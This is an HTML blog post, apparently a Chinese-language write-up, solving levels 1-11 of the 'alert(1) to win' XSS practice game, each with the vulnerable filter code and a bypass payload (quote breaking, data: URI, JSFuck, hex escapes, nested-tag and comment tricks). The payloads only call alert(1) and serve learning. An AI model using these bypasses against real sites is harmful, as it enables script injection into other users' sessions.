@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/noel.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/noel.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="XSS好难啊~~">
+<meta name="keywords" content="Web,xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="alert(1) TO WIN 第一部分">
+<meta property="og:url" content="http://yoursite.com/2019/01/21/alert(1) to win(1)/index.html">
+<meta property="og:site_name" content="Noel&#39;s Blog">
+<meta property="og:description" content="XSS好难啊~~">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-20T16:45:18.341Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="alert(1) TO WIN 第一部分">
+<meta name="twitter:description" content="XSS好难啊~~">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/21/alert(1) to win(1)/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>alert(1) TO WIN 第一部分 | Noel's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Noel's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/21/alert(1) to win(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Noel">
+      <meta itemprop="description" content="I love u">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Noel's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">alert(1) TO WIN 第一部分
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-21 00:00:00 / 修改时间：00:45:18" itemprop="dateCreated datePublished" datetime="2019-01-21T00:00:00+08:00">2019-01-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span id="busuanzi_value_page_pv"></span>次阅读
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>XSS好难啊~~</p>
+<a id="more"></a>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><font color="green">简介</font></h3><p>alert(1) to win 是一个在线XSS练习平台，个人感觉挺有意思的，本篇文章记录的是1-11题</p>
+<h4 id="1-Warmup"><a href="#1-Warmup" class="headerlink" title="1.Warmup"></a><font color="green">1.Warmup</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码很简单，且没做过滤，那么只需要闭合掉双引号和括号即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");alert(1)//</span></span><br><span class="line"><span class="string">还有另一种方式可以减少一个字符输入</span></span><br><span class="line"><span class="string">"</span>);alert(<span class="number">1</span>,<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-Adobe"><a href="#2-Adobe" class="headerlink" title="2.Adobe"></a><font color="green">2.Adobe</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是在第一题基础上把双引号给加上一个<code>&quot;\&quot;</code>转义，那么只需要再转义符号前加一个转义符号即可绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">");alert(1)//</span></span><br></pre></td></tr></table></figure>
+<h4 id="3-Json"><a href="#3-Json" class="headerlink" title="3.Json"></a><font color="green">3.Json</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从本题以后大部分会对引号和反斜杠进行转义</p>
+<p>这题的话可以直接把script结束掉,<code>&lt;script&gt;</code> 标签优先级要高于引号</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="4-JavaScript"><a href="#4-JavaScript" class="headerlink" title="4.JavaScript"></a><font color="green">4.JavaScript</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.href = url;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题在于URL编码，只要将<code>&quot;</code>编码成为%22即可通过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">22</span>);alert(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<h4 id="5-MarkDown"><a href="#5-MarkDown" class="headerlink" title="5.MarkDown"></a><font color="green">5.MarkDown</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">  <span class="comment">// URLs</span></span><br><span class="line">  text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">  <span class="comment">// [[img123|Description]]</span></span><br><span class="line">  text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一题把<code>&lt;</code>与<code>&quot;</code>都进行了HTML实体编码，同时将<code>http:....</code>转换为a标签，把<code>[[a|b]]</code>中的a转换为img标签的src而b则是alt,解开这道题的关键在于img和a标签合在一起共出现了6个双引号</p>
+<p>所以构造</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[a|http:<span class="comment">//onerror=alert(1)//]]</span></span><br></pre></td></tr></table></figure>
+<p>得到的结果为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">"&lt;a href="</span><span class="attr">http:</span>//<span class="attr">onerror</span>=<span class="string">alert(1)//</span>" <span class="attr">src</span>=<span class="string">"a.gif"</span>&gt;</span>"&gt;http://onerror=alert(1)//]]<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-DOM"><a href="#6-DOM" class="headerlink" title="6.DOM"></a><font color="green">6.DOM</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Slightly too lazy to make two input fields.</span></span><br><span class="line">  <span class="comment">// Pass in something like "TextNode#foo"</span></span><br><span class="line">  <span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Only slightly contrived at this point.</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));</span><br><span class="line">  <span class="keyword">return</span> a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一题的意思是将输入数据按#分割，第一份作为创建类型，第二份拼接到第一份中间,这里可以采用createComment也就是注释，来进行alert</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="7-CallBack"><a href="#7-CallBack" class="headerlink" title="7.CallBack"></a><font color="green">7.CallBack</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是用#进行分割，第一段可以出现<code>&#39;</code>,而且没有对<code>&#39;</code>进行处理</p>
+<p>所以这里可以用</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`#`</span>;alert(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p>构造后的到的结果是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">'(&#123;"userdata":"'</span>;alert(<span class="number">1</span>)<span class="comment">//"&#125;)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="8-Skandia"><a href="#8-Skandia" class="headerlink" title="8.Skandia "></a><font color="green">8.Skandia </font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此题会将所有输入的字母转换为大写，这里可以采用data伪协议或者是JsFuck进行绕过</p>
+<p>data:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/html,%61%6c%65%72%74(1)</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+<p>JsFuck:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br></pre></td></tr></table></figure>
+<h4 id="9-Template"><a href="#9-Template" class="headerlink" title="9.Template "></a><font color="green">9.Template </font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/./g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> &#123; <span class="string">'&lt;'</span>: <span class="string">'&amp;lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&amp;gt;'</span>, <span class="string">'&amp;'</span>: <span class="string">'&amp;amp;'</span>, <span class="string">'"'</span>: <span class="string">'&amp;quot;'</span>, <span class="string">"'"</span>: <span class="string">'&amp;#39;'</span> &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span>(<span class="params">template, args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_, n</span>) </span>&#123; </span><br><span class="line">           <span class="keyword">return</span> htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> expandTemplate(</span><br><span class="line">    <span class="string">"                                                \n\</span></span><br><span class="line"><span class="string">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span></span><br><span class="line"><span class="string">      &lt;script&gt;                                       \n\</span></span><br><span class="line"><span class="string">         var v = document.getElementById('name');    \n\</span></span><br><span class="line"><span class="string">         v.innerHTML = '&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;';       \n\</span></span><br><span class="line"><span class="string">      &lt;\/script&gt;                                     \n\</span></span><br><span class="line"><span class="string">    "</span>,</span><br><span class="line">    &#123; <span class="attr">name</span> : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题将<code>&lt;&gt;&amp;&#39;&quot;</code>全部转换为了html实体编码，不过可以通过十六进制的方法进行绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x3cimg src=@ onerror=alert(1) \x3e</span><br></pre></td></tr></table></figure>
+<p>其实\x3c为&lt; \x3e为&gt;</p>
+<h4 id="10-Json2"><a href="#10-Json2" class="headerlink" title="10.Json2"></a><font color="green">10.Json2</font></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/&lt;\/script/gi</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在一的基础上做了一个替换，把<code>&lt;/replace&gt;</code>替换为空，可以采用<code>&lt;/sc&lt;/scriptript&gt;</code>的形式绕过</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/sc&lt;/scriptript&gt;&lt;script&gt;alert(1);//</span><br></pre></td></tr></table></figure>
+<h4 id="11-CallBack2"><a href="#11-CallBack2" class="headerlink" title="11.CallBack2"></a><font color="green">11.CallBack2</font></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn "callback#userdata"</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';</span><br><span class="line">  var obj = &#123;'userdata': thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/\//g, '\\/');</span><br><span class="line">  return "<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">" + thing[0] + "</span>(<span class="string">" + json +"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相较于1，这里将斜杠和反斜杠进行转义，所以无法用<code>&lt;/script&gt;</code>结束script,也不能用//进行注释，不过可以用&lt;!–,使JavaScript终止</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'#';alert(1)<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/17/XSS跨站脚本攻击剖析与防御-1/" rel="next" title="XSS初探">
+                <i class="fa fa-chevron-left"></i> XSS初探
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Noel</p>
+              <p class="site-description motion-element" itemprop="description">I love u</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
